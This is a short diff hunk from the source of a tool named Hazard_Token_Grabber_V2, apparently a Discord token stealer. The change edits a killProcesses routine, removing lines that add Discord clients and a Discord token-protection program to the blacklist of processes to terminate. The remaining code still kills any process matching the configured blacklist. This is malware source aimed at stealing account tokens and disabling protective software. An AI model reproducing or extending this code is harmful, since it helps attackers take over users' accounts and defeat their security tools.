@@ -198,8 +198,6 @@ class Hazard_Token_Grabber_V2(functions):
 
     async def killProcesses(self):
         blackListedPrograms = self.fetchConf('blackListedPrograms')
-        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
-            blackListedPrograms.append(i)
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
                 try:
